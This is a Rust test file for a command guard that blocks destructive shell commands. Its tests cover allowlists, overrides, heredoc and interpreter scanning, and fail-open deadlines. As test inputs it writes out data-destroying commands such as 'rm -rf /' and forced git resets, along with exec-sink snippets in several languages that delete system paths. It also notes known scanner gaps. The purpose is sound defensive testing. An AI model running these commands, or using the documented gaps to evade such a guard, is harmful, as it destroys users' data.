    #[test]
    fn allowlist_hit_overrides_deny() {
        let config = default_config();
        let compiled = default_compiled_overrides();
        let allowlists = project_allowlists_for_rule("core.git:reset-hard", "local dev flow");

        let result = evaluate_command(
            "git reset --hard",
            &config,
            &["git"],
            &compiled,
            &allowlists,
        );
        assert!(result.is_allowed());
        assert!(result.allowlist_override.is_some());
    }

    #[test]
    fn allowlist_miss_does_not_change_decision() {
        let config = default_config();
        let compiled = default_compiled_overrides();
        let allowlists = project_allowlists_for_rule("core.git:reset-merge", "not this one");

        let result = evaluate_command(
            "git reset --hard",
            &config,
            &["git"],
            &compiled,
            &allowlists,
        );
        assert!(result.is_denied());
        assert!(result.allowlist_override.is_none());
        assert_eq!(result.pack_id(), Some("core.git"));
    }

    #[test]
    fn wildcard_allowlist_matches_only_within_pack() {
        let mut config = default_config();
        config.packs.enabled.push("strict_git".to_string());

        let compiled = config.overrides.compile();
        let allowlists = project_allowlists_for_pack_wildcard("core.git", "allow all core.git");

        // Matches core.git, should allow.
        let git_result = evaluate_command(
            "git reset --hard",
            &config,
            &["git", "rm"],
            &compiled,
            &allowlists,
        );
        assert!(git_result.is_allowed());
        assert!(git_result.allowlist_override.is_some());

        // Matches core.filesystem, should still deny (wildcard is pack-scoped).
        let rm_result = evaluate_command(
            "rm -rf /etc",
            &config,
            &["git", "rm"],
            &compiled,
            &allowlists,
        );
        assert!(rm_result.is_denied());
        assert_eq!(rm_result.pack_id(), Some("core.filesystem"));
    }

    #[test]
    fn allowlisting_one_rule_does_not_disable_other_packs() {
        let mut config = default_config();
        config.packs.enabled.push("strict_git".to_string());

        let compiled = config.overrides.compile();
        let allowlists =
            project_allowlists_for_rule("core.git:push-force-long", "allow core force");

        // This command matches BOTH core.git and strict_git.
        // We allowlisted core.git:push-force-long.
        // So core.git should ALLOW it.
        // But strict_git should still DENY it (as it checks later and isn't allowlisted).
        let result = evaluate_command(
            "git push origin main --force",
            &config,
            &["git"],
            &compiled,
            &allowlists,
        );

        assert!(result.is_denied());
        // strict_git checks AFTER core.git.
        // core.git allows it (due to override).
        // strict_git blocks it.
        // So we expect strict_git.
        assert_eq!(result.pack_id(), Some("strict_git"));
        assert_eq!(
            result
                .pattern_info
                .as_ref()
                .unwrap()
                .pattern_name
                .as_deref(),
            Some("push-force-any") // strict_git rule name
        );
    }

    // =========================================================================
    // Evaluator Behavior Tests (git_safety_guard-99e.3.5, git_safety_guard-1g6)
    // =========================================================================
    //
    // These tests verify evaluator behavior using real pack patterns.
    // Mock types removed per git_safety_guard-1g6.

    /// Table-driven test: commands that should be ALLOWED.
    #[test]
    fn evaluator_allows_safe_commands() {
        let config = default_config();
        let compiled = default_compiled_overrides();
        let allowlists = default_allowlists();
        let keywords = &["git", "rm", "docker", "kubectl"];

        let test_cases = [
            // Non-relevant commands (quick-rejected)
            "ls -la",
            "cargo build --release",
            "npm install",
            "echo hello",
            "cat /etc/passwd",
            // Empty command
            "",
        ];

        for cmd in test_cases {
            let result = evaluate_command(cmd, &config, keywords, &compiled, &allowlists);
            assert!(
                result.is_allowed(),
                "Expected ALLOWED for {cmd:?}, got DENIED"
            );
        }
    }

    /// Test: config allow overrides work correctly.
    #[test]
    fn evaluator_respects_config_allow_override() {
        let config = default_config();
        let compiled = default_compiled_overrides();

        let tmp = std::env::temp_dir();
        let unique = COUNTER.fetch_add(1, Ordering::Relaxed);
        let path = tmp.join(format!(
            "dcg_allowlist_test_{}_{}.toml",
            std::process::id(),
            unique
        ));

        let toml = r#"
            [[allow]]
            rule = "core.git:reset-hard"
            reason = "integration test"
        "#;
        std::fs::write(&path, toml).expect("write allowlist file");

        let allowlists = LayeredAllowlist::load_from_paths(Some(path), None, None);

        let result = evaluate_command(
            "git reset --hard",
            &config,
            &["git"],
            &compiled,
            &allowlists,
        );
        assert!(result.is_allowed());
        assert!(result.allowlist_override.is_some());
    }

    #[test]
    fn config_block_override_wins_over_overlapping_allow_in_main_path() {
        let mut config = default_config();
        config.overrides.allow = vec![crate::config::AllowOverride::Simple(
            r"\bgit\s+reset\s+--hard\b".to_string(),
        )];
        config.overrides.block = vec![crate::config::BlockOverride {
            pattern: r"\bgit\s+reset\s+--hard\b".to_string(),
            reason: "explicit config block".to_string(),
        }];

        let compiled = config.overrides.compile();
        let allowlists = default_allowlists();
        let result = evaluate_command(
            "git reset --hard",
            &config,
            &["git"],
            &compiled,
            &allowlists,
        );

        assert!(result.is_denied());
        assert_eq!(result.reason(), Some("explicit config block"));
        assert_eq!(
            result.pattern_info.as_ref().unwrap().source,
            MatchSource::ConfigOverride
        );
    }

    #[test]
    fn config_block_override_wins_over_overlapping_allow_in_legacy_path() {
        let mut config = default_config();
        config.overrides.allow = vec![crate::config::AllowOverride::Simple(
            r"\bgit\s+reset\s+--hard\b".to_string(),
        )];
        config.overrides.block = vec![crate::config::BlockOverride {
            pattern: r"\bgit\s+reset\s+--hard\b".to_string(),
            reason: "explicit config block".to_string(),
        }];

        let compiled = config.overrides.compile();
        let allowlists = default_allowlists();
        let result = evaluate_command_with_legacy::<
            crate::packs::SafePattern,
            crate::packs::DestructivePattern,
        >(
            "git reset --hard",
            &config,
            &["git"],
            &compiled,
            &allowlists,
            &[],
            &[],
        );

        assert!(result.is_denied());
        assert_eq!(result.reason(), Some("explicit config block"));
        assert_eq!(
            result.pattern_info.as_ref().unwrap().source,
            MatchSource::ConfigOverride
        );
    }

    // =========================================================================
    // Match Span Tests (git_safety_guard-99e.2.4)
    // =========================================================================

    #[test]
    fn truncate_preview_handles_utf8_safely() {
        // ASCII string
        let short = "hello";
        assert_eq!(super::truncate_preview(short, 10), "hello");

        // Exactly at limit
        let exact = "hello";
        assert_eq!(super::truncate_preview(exact, 5), "hello");

        // Over limit, needs truncation
        let long = "hello world";
        assert_eq!(super::truncate_preview(long, 8), "hello...");

        // UTF-8 multibyte characters (should not break in middle of char)
        let japanese = "こんにちは世界"; // 7 chars, 21 bytes
        let truncated = super::truncate_preview(japanese, 5);
        assert!(truncated.ends_with("..."));
        // Should have 2 chars + "..."
        assert_eq!(truncated, "こん...");

        // Emoji
        let emoji = "🔥🔥🔥🔥🔥"; // 5 emoji, 20 bytes
        let truncated_emoji = super::truncate_preview(emoji, 3);
        assert_eq!(truncated_emoji, "..."); // 0 chars + "..." since 3-3=0
    }

    #[test]
    fn extract_match_preview_bounds_check() {
        let cmd = "rm -rf /important";

        // Normal span
        let span = super::MatchSpan { start: 0, end: 2 };
        assert_eq!(super::extract_match_preview(cmd, &span), "rm");

        // Span at end
        let span_end = super::MatchSpan { start: 7, end: 17 };
        assert_eq!(super::extract_match_preview(cmd, &span_end), "/important");

        // Span beyond bounds (should clamp)
        let span_overflow = super::MatchSpan {
            start: 0,
            end: 1000,
        };
        assert_eq!(
            super::extract_match_preview(cmd, &span_overflow),
            "rm -rf /important"
        );

        // Start beyond end (should return empty)
        let span_invalid = super::MatchSpan {
            start: 100,
            end: 50,
        };
        assert_eq!(super::extract_match_preview(cmd, &span_invalid), "");
    }

    #[test]
    fn extract_match_preview_handles_invalid_utf8_boundaries() {
        // Multi-byte UTF-8: "日本" is 6 bytes (3 bytes per character)
        let cmd = "日本語"; // 9 bytes, 3 characters

        // Valid boundaries (0, 3, 6, 9 are all valid)
        let valid_span = super::MatchSpan { start: 0, end: 3 };
        assert_eq!(super::extract_match_preview(cmd, &valid_span), "日");

        // Invalid start boundary (byte 1 is middle of first char)
        // Should snap forward to byte 3 (start of second char)
        let invalid_start = super::MatchSpan { start: 1, end: 6 };
        assert_eq!(super::extract_match_preview(cmd, &invalid_start), "本");

        // Invalid end boundary (byte 4 is middle of second char)
        // Should snap backward to byte 3 (end of first char)
        let invalid_end = super::MatchSpan { start: 0, end: 4 };
        assert_eq!(super::extract_match_preview(cmd, &invalid_end), "日");

        // Both boundaries invalid - should still not panic
        let both_invalid = super::MatchSpan { start: 1, end: 4 };
        // start snaps to 3, end snaps to 3, so start >= end -> empty
        assert_eq!(super::extract_match_preview(cmd, &both_invalid), "");

        // Span entirely within a character (start=1, end=2)
        // Both snap to boundaries, resulting in empty
        let within_char = super::MatchSpan { start: 1, end: 2 };
        assert_eq!(super::extract_match_preview(cmd, &within_char), "");
    }

    #[test]
    fn heredoc_matches_include_span_info() {
        let mut config = default_config();
        config.packs.enabled.push("system.core".to_string());
        let compiled = config.overrides.compile();
        let allowlists = default_allowlists();
        let enabled_packs = config.enabled_pack_ids();
        let keywords_vec = crate::packs::REGISTRY.collect_enabled_keywords(&enabled_packs);
        let keywords: Vec<&str> = keywords_vec.clone();

        // Heredoc containing dangerous command
        let cmd = "cat <<'EOF'\nrm -rf /\nEOF";

        let result = evaluate_command(cmd, &config, &keywords, &compiled, &allowlists);

        if result.is_denied() {
            if let Some(ref pattern_info) = result.pattern_info {
                // If there's a span, verify it's valid
                if let Some(span) = pattern_info.matched_span {
                    assert!(span.start <= span.end, "Span start should not exceed end");
                    assert!(
                        span.end <= cmd.len(),
                        "Span end should not exceed command length"
                    );
                    let matched = cmd.get(span.start..span.end).unwrap_or("");
                    assert!(
                        matched.contains("rm -rf /"),
                        "Matched span should point into heredoc content"
                    );
                }
            }
        }
    }

    #[test]
    fn match_span_maps_to_original_with_wrappers() {
        let mut config = default_config();
        config.packs.enabled.push("core.git".to_string());
        let compiled = config.overrides.compile();
        let allowlists = default_allowlists();
        let enabled_packs = config.enabled_pack_ids();
        let keywords_vec = crate::packs::REGISTRY.collect_enabled_keywords(&enabled_packs);
        let keywords: Vec<&str> = keywords_vec.clone();

        let cmd = "sudo git reset --hard";
        let result = evaluate_command(cmd, &config, &keywords, &compiled, &allowlists);

        assert!(result.is_denied(), "Command should be denied");
        let pattern_info = result.pattern_info.expect("Expected pattern info");
        let span = pattern_info.matched_span.expect("Expected matched span");
        let matched = cmd.get(span.start..span.end).unwrap_or("");
        assert_eq!(matched, "git reset --hard");
    }

    #[test]
    fn match_span_determinism() {
        let mut config = default_config();
        config.packs.enabled.push("system.core".to_string());
        let compiled = config.overrides.compile();
        let allowlists = default_allowlists();
        let enabled_packs = config.enabled_pack_ids();
        let keywords_vec = crate::packs::REGISTRY.collect_enabled_keywords(&enabled_packs);
        let keywords: Vec<&str> = keywords_vec.clone();

        let cmd = "rm -rf /";

        // Run multiple times and verify same result
        let result1 = evaluate_command(cmd, &config, &keywords, &compiled, &allowlists);
        let result2 = evaluate_command(cmd, &config, &keywords, &compiled, &allowlists);

        assert_eq!(result1.decision, result2.decision);
        assert_eq!(
            result1.pattern_info.as_ref().map(|p| p.matched_span),
            result2.pattern_info.as_ref().map(|p| p.matched_span),
            "Match span should be deterministic"
        );
        assert_eq!(
            result1
                .pattern_info
                .as_ref()
                .map(|p| p.matched_text_preview.as_ref()),
            result2
                .pattern_info
                .as_ref()
                .map(|p| p.matched_text_preview.as_ref()),
            "Match text preview should be deterministic"
        );
    }

    // =========================================================================
    // #136 REVERTED: interpreter-stdin bodies are conservatively raw-shell scanned
    //
    // `python3 - <<PY` / `node - <<JS` feed a *program* to an interpreter's
    // stdin. The #136 language-aware string-literal masking (which allowed a
    // destructive token inside an inert string/comment literal like
    // `print("rm -rf x")`) was REVERTED (commit ebc4fc1) to restore ZERO false
    // negatives: interpreter bodies now flow through the conservative raw-shell
    // scan, so a destructive literal CONSERVATIVELY BLOCKS (accepted false
    // positive). Real executing sinks (`os.system`, `subprocess.*`,
    // `child_process.exec*`, Ruby/Perl `system`/backticks, …) of course still
    // block. Only the `cat`/`tee` data-sink masking from #109 remains. The
    // destructive token is assembled at runtime so this test source itself can't
    // trip a pre-exec hook scanning the repo.
    // =========================================================================

    mod interpreter_heredoc_string_literals_136 {
        use super::*;

        const CORE: &[&str] = &["core.filesystem", "core.git"];

        fn rmrf() -> String {
            // "rm -rf" without writing the literal token in source.
            format!("{}{}{}", "rm", " -", "rf")
        }

        fn blocked(command: &str) -> bool {
            evaluate_with_pack_ids(command, CORE).is_denied()
        }

        // ---- Inert literals: #136 reverted, so these now CONSERVATIVELY BLOCK
        // (interpreter bodies are raw-shell scanned; a destructive literal blocks
        // as an accepted false positive, preserving zero false negatives). Inert
        // *comments* are still allowed (see `python_comment_is_allowed`).

        #[test]
        fn python_print_string_literal_now_conservatively_blocked() {
            let cmd = format!("python3 - <<PY\nprint(\"{} /etc/important\")\nPY", rmrf());
            // #136 reverted: interpreter bodies are raw-shell scanned, so a
            // destructive literal blocks (accepted false positive; zero false
            // negatives).
            assert!(
                blocked(&cmd),
                "raw-shell scan of interpreter body conservatively blocks: {cmd:?}"
            );
        }

        #[test]
        fn python_print_relative_path_literal_now_conservatively_blocked() {
            let cmd = format!("python3 - <<PY\nimport os\nprint(\"{} build\")\nPY", rmrf());
            // #136 reverted: interpreter bodies are raw-shell scanned, so a
            // destructive literal blocks (accepted false positive; zero false
            // negatives).
            assert!(
                blocked(&cmd),
                "raw-shell scan of interpreter body conservatively blocks: {cmd:?}"
            );
        }

        #[test]
        fn python_comment_is_allowed() {
            let cmd = format!("python3 - <<PY\n# {} /etc note\nprint(1)\nPY", rmrf());
            assert!(!blocked(&cmd), "inert comment must not block: {cmd:?}");
        }

        #[test]
        fn node_console_log_string_literal_now_conservatively_blocked() {
            let cmd = format!("node - <<JS\nconsole.log(\"{} build\")\nJS", rmrf());
            // #136 reverted: interpreter bodies are raw-shell scanned, so a
            // destructive literal blocks (accepted false positive; zero false
            // negatives).
            assert!(
                blocked(&cmd),
                "raw-shell scan of interpreter body conservatively blocks: {cmd:?}"
            );
        }

        #[test]
        fn node_variable_assignment_without_sink_now_conservatively_blocked() {
            // The destructive string is assigned and merely logged — no exec sink —
            // but raw-shell sees the literal in the assignment and blocks.
            let cmd = format!(
                "node - <<JS\nconst x = \"{} /etc\"\nconsole.log(x)\nJS",
                rmrf()
            );
            // #136 reverted: interpreter bodies are raw-shell scanned, so a
            // destructive literal blocks (accepted false positive; zero false
            // negatives).
            assert!(
                blocked(&cmd),
                "raw-shell scan of interpreter body conservatively blocks: {cmd:?}"
            );
        }

        // ---- Executing sinks: MUST stay blocked ---------------------------

        #[test]
        fn python_os_system_real_deletion_is_blocked() {
            let cmd = format!(
                "python3 - <<PY\nimport os\nos.system(\"{} /etc/important\")\nPY",
                rmrf()
            );
            assert!(blocked(&cmd), "os.system exec sink must block: {cmd:?}");
        }

        #[test]
        fn python_os_popen_real_deletion_is_blocked() {
            let cmd = format!(
                "python3 - <<PY\nimport os\nos.popen(\"{} /etc/important\")\nPY",
                rmrf()
            );
            assert!(blocked(&cmd), "os.popen exec sink must block: {cmd:?}");
        }

        #[test]
        fn python_subprocess_run_shell_true_is_blocked() {
            let cmd = format!(
                "python3 - <<PY\nimport subprocess\nsubprocess.run(\"{} /etc/important\", shell=True)\nPY",
                rmrf()
            );
            assert!(
                blocked(&cmd),
                "subprocess.run exec sink must block: {cmd:?}"
            );
        }

        #[test]
        fn node_child_process_execsync_is_blocked() {
            let cmd = format!(
                "node - <<JS\nchild_process.execSync(\"{} /etc/important\")\nJS",
                rmrf()
            );
            assert!(blocked(&cmd), "child_process.execSync must block: {cmd:?}");
        }

        #[test]
        fn node_aliased_require_execsync_is_blocked() {
            // Aliased require — slips past ast-grep call-shape patterns; the
            // name-anchored exec-sink backstop must still catch it.
            let cmd = format!(
                "node - <<JS\nconst cp = require(\"child_process\")\ncp.execSync(\"{} /etc/important\")\nJS",
                rmrf()
            );
            assert!(
                blocked(&cmd),
                "aliased require().execSync must block (backstop): {cmd:?}"
            );
        }

        #[test]
        fn node_double_quote_require_execsync_is_blocked() {
            let cmd = format!(
                "node - <<JS\nrequire(\"child_process\").execSync(\"{} /etc/important\")\nJS",
                rmrf()
            );
            assert!(
                blocked(&cmd),
                "double-quote require().execSync must block (backstop): {cmd:?}"
            );
        }

        #[test]
        fn ruby_system_real_deletion_is_blocked() {
            let cmd = format!("ruby - <<RB\nsystem(\"{} /etc/important\")\nRB", rmrf());
            assert!(blocked(&cmd), "ruby system() must block: {cmd:?}");
        }

        #[test]
        fn perl_system_real_deletion_is_blocked() {
            let cmd = format!("perl - <<PL\nsystem(\"{} /etc/important\");\nPL", rmrf());
            assert!(blocked(&cmd), "perl system() must block: {cmd:?}");
        }

        // ---- #136 regression: exec-sink FNs the masking previously leaked ----
        // PHP/Go/Perl were masked WITHOUT comprehensive exec-sink escalation, so
        // these slipped through. They are now unmasked (conservative raw-shell
        // scan), and Node/Ruby coverage was widened. Every case MUST block.

        #[test]
        fn php_system_real_deletion_is_blocked() {
            let cmd = format!(
                "php - <<PHP\n<?php system(\"{} /etc/important\"); ?>\nPHP",
                rmrf()
            );
            assert!(blocked(&cmd), "php system() must block: {cmd:?}");
        }

        #[test]
        fn php_shell_exec_real_deletion_is_blocked() {
            let cmd = format!(
                "php - <<PHP\n<?php shell_exec(\"{} /etc/important\"); ?>\nPHP",
                rmrf()
            );
            assert!(blocked(&cmd), "php shell_exec() must block: {cmd:?}");
        }

        #[test]
        fn php_exec_passthru_real_deletion_is_blocked() {
            for sink in ["exec", "passthru", "popen"] {
                let cmd = format!(
                    "php - <<PHP\n<?php {sink}(\"{} /etc/important\"); ?>\nPHP",
                    rmrf()
                );
                assert!(blocked(&cmd), "php {sink}() must block: {cmd:?}");
            }
        }

        #[test]
        fn go_exec_command_real_deletion_is_blocked() {
            let cmd = format!(
                "go run - <<GO\npackage main\nimport \"os/exec\"\nfunc main(){{ exec.Command(\"sh\",\"-c\",\"{} /etc/important\").Run() }}\nGO",
                rmrf()
            );
            assert!(blocked(&cmd), "go exec.Command() must block: {cmd:?}");
        }

        #[test]
        fn perl_qx_real_deletion_is_blocked() {
            let cmd = format!("perl - <<PL\nqx({} /etc/important);\nPL", rmrf());
            assert!(blocked(&cmd), "perl qx() must block: {cmd:?}");
        }

        #[test]
        fn perl_open_pipe_real_deletion_is_blocked() {
            let cmd = format!("perl - <<PL\nopen(F,\"{} /etc/important|\");\nPL", rmrf());
            assert!(blocked(&cmd), "perl open(\"cmd|\") must block: {cmd:?}");
        }

        #[test]
        fn node_execfile_real_deletion_is_blocked() {
            let cmd = format!(
                "node - <<JS\nrequire(\"child_process\").execFile(\"sh\",[\"-c\",\"{} /etc/important\"])\nJS",
                rmrf()
            );
            assert!(blocked(&cmd), "node execFile() must block: {cmd:?}");
        }

        #[test]
        fn node_execfilesync_real_deletion_is_blocked() {
            let cmd = format!(
                "node - <<JS\nrequire(\"child_process\").execFileSync(\"sh\",[\"-c\",\"{} /etc/important\"])\nJS",
                rmrf()
            );
            assert!(blocked(&cmd), "node execFileSync() must block: {cmd:?}");
        }

        #[test]
        fn node_fork_real_deletion_is_blocked() {
            let cmd = format!(
                "node - <<JS\nrequire(\"child_process\").fork(\"{} /etc/important\")\nJS",
                rmrf()
            );
            assert!(blocked(&cmd), "node fork() must block: {cmd:?}");
        }

        // split-argv exec sinks (spawn("rm",["-rf"])) are a known pre-existing raw-shell gap, out of scope post-#136-revert.

        #[test]
        fn node_execfile_non_catastrophic_target_is_blocked() {
            // Non-catastrophic relative target inside a real exec sink must still
            // block (escalation to >= High).
            let cmd = format!(
                "node - <<JS\nrequire(\"child_process\").execFile(\"sh\",[\"-c\",\"{} myproj/data\"])\nJS",
                rmrf()
            );
            assert!(
                blocked(&cmd),
                "node execFile() non-catastrophic target must block: {cmd:?}"
            );
        }

        #[test]
        fn ruby_percent_x_real_deletion_is_blocked() {
            for cmd in [
                format!("ruby - <<RB\n%x({} /etc/important)\nRB", rmrf()),
                format!("ruby - <<RB\n%x{{{} /etc/important}}\nRB", rmrf()),
                format!("ruby - <<RB\n%x[{} /etc/important]\nRB", rmrf()),
            ] {
                assert!(blocked(&cmd), "ruby %x command must block: {cmd:?}");
            }
        }

        #[test]
        fn ruby_backticks_real_deletion_is_blocked() {
            let cmd = format!("ruby - <<RB\n`{} /etc/important`\nRB", rmrf());
            assert!(blocked(&cmd), "ruby backticks must block: {cmd:?}");
        }

        #[test]
        fn ruby_io_popen_real_deletion_is_blocked() {
            let cmd = format!("ruby - <<RB\nIO.popen(\"{} /etc/important\")\nRB", rmrf());
            assert!(blocked(&cmd), "ruby IO.popen() must block: {cmd:?}");
        }

        #[test]
        fn ruby_open3_real_deletion_is_blocked() {
            let cmd = format!(
                "ruby - <<RB\nOpen3.capture2(\"{} /etc/important\")\nRB",
                rmrf()
            );
            assert!(blocked(&cmd), "ruby Open3.capture2() must block: {cmd:?}");
        }

        #[test]
        fn ruby_system_non_catastrophic_target_is_blocked() {
            // Non-catastrophic relative target inside a real Ruby exec sink must
            // still block (escalation to >= High).
            let cmd = format!("ruby - <<RB\nsystem(\"{} myproj/data\")\nRB", rmrf());
            assert!(
                blocked(&cmd),
                "ruby system() non-catastrophic target must block: {cmd:?}"
            );
        }

        // ---- #136 reverted: inert literals now CONSERVATIVELY BLOCK ----------
        // Interpreter bodies are raw-shell scanned, so even an inert string/list
        // literal containing a destructive token blocks (accepted false positive;
        // zero false negatives).

        #[test]
        fn ruby_puts_string_literal_now_conservatively_blocked() {
            let cmd = format!("ruby - <<RB\nputs(\"{} build\")\nRB", rmrf());
            // #136 reverted: interpreter bodies are raw-shell scanned, so a
            // destructive literal blocks (accepted false positive; zero false
            // negatives).
            assert!(
                blocked(&cmd),
                "raw-shell scan of interpreter body conservatively blocks: {cmd:?}"
            );
        }

        #[test]
        fn python_inert_list_literal_now_conservatively_blocked() {
            let cmd = format!(
                "python3 - <<PY\nx = [\"sh\",\"-c\",\"{} build\"]\nprint(x)\nPY",
                rmrf()
            );
            // #136 reverted: interpreter bodies are raw-shell scanned, so a
            // destructive literal blocks (accepted false positive; zero false
            // negatives).
            assert!(
                blocked(&cmd),
                "raw-shell scan of interpreter body conservatively blocks: {cmd:?}"
            );
        }

        #[test]
        fn python_shutil_rmtree_is_blocked() {
            let cmd = "python3 - <<PY\nimport shutil\nshutil.rmtree(\"/etc\")\nPY";
            assert!(blocked(cmd), "shutil.rmtree must block: {cmd:?}");
        }

        // ---- Shell heredocs are NOT a non-shell interpreter: stay blocked --

        #[test]
        fn bash_heredoc_real_deletion_stays_blocked() {
            let cmd = format!("bash <<SH\n{} /etc/important\nSH", rmrf());
            assert!(
                blocked(&cmd),
                "bash heredoc shell body must stay blocked: {cmd:?}"
            );
        }

        #[test]
        fn cat_sink_string_literal_is_allowed() {
            let cmd = format!("cat > f.py <<PY\nprint(\"{} build\")\nPY", rmrf());
            assert!(!blocked(&cmd), "cat data sink must not block: {cmd:?}");
        }
    }

    // =========================================================================
    // Deadline / Fail-Open Tests (git_safety_guard-99e.14)
    // =========================================================================

    mod deadline_tests {
        use super::*;
        use crate::perf::Deadline;
        use std::time::Duration;

        fn test_heredoc_settings() -> crate::config::HeredocSettings {
            crate::config::Config::default().heredoc_settings()
        }

        /// When deadline is already exceeded (zero duration), evaluation should fail-open immediately.
        #[test]
        fn exceeded_deadline_fails_open() {
            let compiled_overrides = default_compiled_overrides();
            let allowlists = default_allowlists();
            let heredoc_settings = test_heredoc_settings();
            let enabled_keywords: Vec<&str> = vec!["git", "rm"];
            let ordered_packs: Vec<String> = vec!["core.git".to_string()];
            let keyword_index = crate::packs::REGISTRY.build_enabled_keyword_index(&ordered_packs);

            // Create a deadline with zero duration - should be immediately exceeded
            let deadline = Deadline::new(Duration::ZERO);

            let result = evaluate_command_with_pack_order_deadline(
                "git reset --hard",
                &enabled_keywords,
                &ordered_packs,
                keyword_index.as_ref(),
                &compiled_overrides,
                &allowlists,
                &heredoc_settings,
                None,
                Some(&deadline),
            );

            // Should allow due to budget exhaustion, not deny
            assert!(
                result.is_allowed(),
                "Zero-duration deadline should fail open and allow command"
            );
            assert!(
                result.skipped_due_to_budget,
                "Result should indicate it was skipped due to budget"
            );
        }

        /// Normal deadline should allow evaluation to proceed.
        #[test]
        fn normal_deadline_allows_evaluation() {
            let compiled_overrides = default_compiled_overrides();
            let allowlists = default_allowlists();
            let heredoc_settings = test_heredoc_settings();
            let enabled_keywords: Vec<&str> = vec!["git", "rm"];
            let ordered_packs: Vec<String> = vec!["core.git".to_string()];
            let keyword_index = crate::packs::REGISTRY.build_enabled_keyword_index(&ordered_packs);

            // Create a generous deadline
            let deadline = Deadline::new(Duration::from_secs(10));

            let result = evaluate_command_with_pack_order_deadline(
                "git reset --hard",
                &enabled_keywords,
                &ordered_packs,
                keyword_index.as_ref(),
                &compiled_overrides,
                &allowlists,
                &heredoc_settings,
                None,
                Some(&deadline),
            );

            // Should deny the destructive command normally
            assert!(
                result.is_denied(),
                "Normal deadline should allow evaluation to proceed and deny destructive command"
            );
            assert!(
                !result.skipped_due_to_budget,
                "Result should not indicate budget skip"
            );
        }

        /// No deadline (None) should allow evaluation to proceed.
        #[test]
        fn no_deadline_allows_evaluation() {
            let compiled_overrides = default_compiled_overrides();
            let allowlists = default_allowlists();
            let heredoc_settings = test_heredoc_settings();
            let enabled_keywords: Vec<&str> = vec!["git", "rm"];
            let ordered_packs: Vec<String> = vec!["core.git".to_string()];
            let keyword_index = crate::packs::REGISTRY.build_enabled_keyword_index(&ordered_packs);

            let result = evaluate_command_with_pack_order_deadline(
                "git reset --hard",
                &enabled_keywords,
                &ordered_packs,
                keyword_index.as_ref(),
                &compiled_overrides,
                &allowlists,
                &heredoc_settings,
                None,
                None, // No deadline
            );

            // Should deny the destructive command normally
            assert!(
                result.is_denied(),
                "No deadline should allow evaluation to proceed and deny destructive command"
            );
            assert!(
                !result.skipped_due_to_budget,
                "Result should not indicate budget skip"
            );
        }

        /// Safe commands should be allowed even with tight deadline.
        #[test]
        fn safe_command_with_deadline() {
            let compiled_overrides = default_compiled_overrides();
            let allowlists = default_allowlists();
            let heredoc_settings = test_heredoc_settings();
            let enabled_keywords: Vec<&str> = vec!["git", "rm"];
            let ordered_packs: Vec<String> = vec!["core.git".to_string()];
            let keyword_index = crate::packs::REGISTRY.build_enabled_keyword_index(&ordered_packs);

            // Generous deadline for safe command
            let deadline = Deadline::new(Duration::from_secs(10));

            let result = evaluate_command_with_pack_order_deadline(
                "git status",
                &enabled_keywords,
                &ordered_packs,
                keyword_index.as_ref(),
                &compiled_overrides,
                &allowlists,
                &heredoc_settings,
                None,
                Some(&deadline),
            );

            // Should allow safe command
            assert!(result.is_allowed(), "Safe command should be allowed");
            assert!(
                !result.skipped_due_to_budget,
                "Safe command should not trigger budget skip"
            );
        }

        /// Test the `allowed_due_to_budget()` result structure.
        #[test]
        fn allowed_due_to_budget_structure() {
            let result = EvaluationResult::allowed_due_to_budget();

            assert!(result.is_allowed());
            assert!(!result.is_denied());
            assert!(result.skipped_due_to_budget);
            assert!(result.pattern_info.is_none());
            assert!(result.allowlist_override.is_none());
            assert!(result.effective_mode.is_none());
        }

        /// Safe pattern matching must respect deadline — a burst of backtracking
        /// safe patterns should not run unbounded past the deadline.
        #[test]
        fn deadline_enforced_during_safe_pattern_matching() {
            use crate::packs::Pack;

            let mut safe_patterns = Vec::new();
            for i in 0..20 {
                safe_patterns.push(crate::packs::SafePattern {
                    regex: crate::packs::regex_engine::LazyCompiledRegex::new(
                        // Lookahead forces backtracking engine; nested quantifiers
                        // cause worst-case backtracking on the adversarial input below.
                        if i % 2 == 0 {
                            r"(?=.*safe_cmd)(\w+\s+)*\w+"
                        } else {
                            r"(?=.*no_match_ever)(\w+\s+)*\w+"
                        },
                    ),
                    name: "adversarial_safe",
                });
            }
            let pack = Pack {
                id: "test.adversarial".to_string(),
                name: "adversarial",
                description: "test pack",
                keywords: &["rm"],
                safe_patterns,
                destructive_patterns: vec![crate::destructive_pattern!(
                    "adversarial_rm",
                    r"rm\b",
                    "test destructive",
                    High
                )],
                keyword_matcher: None,
                safe_regex_set: None,
                safe_regex_set_is_complete: false,
            };

            // Craft adversarial input: keyword match + repetitive whitespace tokens
            // that cause exponential backtracking in (\w+\s+)*\w+
            let adversarial = format!("rm {}", "a ".repeat(30));

            // Zero-duration deadline should cause safe matching to bail out
            let deadline = Deadline::new(Duration::ZERO);
            let result = pack.matches_safe_with_deadline(&adversarial, Some(&deadline));
            assert!(
                !result,
                "Should bail out (return false) when deadline exceeded during safe pattern scan"
            );
        }

        /// Post-find deadline check: after a slow destructive regex.find(), the
        /// evaluator should bail before processing the match result.
        #[test]
        fn deadline_enforced_after_destructive_regex_find() {
            let compiled_overrides = default_compiled_overrides();
            let allowlists = default_allowlists();
            let heredoc_settings = test_heredoc_settings();
            let enabled_keywords: Vec<&str> = vec!["rm"];
            let ordered_packs: Vec<String> = vec!["core.filesystem".to_string()];
            let keyword_index = crate::packs::REGISTRY.build_enabled_keyword_index(&ordered_packs);

            // Deadline that's already expired
            let deadline = Deadline::new(Duration::ZERO);
            std::thread::sleep(Duration::from_millis(1));

            let result = evaluate_command_with_pack_order_deadline(
                "rm -rf /important",
                &enabled_keywords,
                &ordered_packs,
                keyword_index.as_ref(),
                &compiled_overrides,
                &allowlists,
                &heredoc_settings,
                None,
                Some(&deadline),
            );

            assert!(result.is_allowed());
            assert!(result.skipped_due_to_budget);
        }

        /// With a generous deadline, destructive commands should still be denied
        /// even with backtracking patterns present — deadline enforcement must
        /// not swallow legitimate matches.
        #[test]
        fn generous_deadline_still_denies_destructive() {
            let compiled_overrides = default_compiled_overrides();
            let allowlists = default_allowlists();
            let heredoc_settings = test_heredoc_settings();
            let enabled_keywords: Vec<&str> = vec!["git"];
            let ordered_packs: Vec<String> = vec!["core.git".to_string()];
            let keyword_index = crate::packs::REGISTRY.build_enabled_keyword_index(&ordered_packs);

            let deadline = Deadline::new(Duration::from_secs(30));

            let result = evaluate_command_with_pack_order_deadline(
                "git reset --hard HEAD~5",
                &enabled_keywords,
                &ordered_packs,
                keyword_index.as_ref(),
                &compiled_overrides,
                &allowlists,
                &heredoc_settings,
                None,
                Some(&deadline),
            );

            assert!(
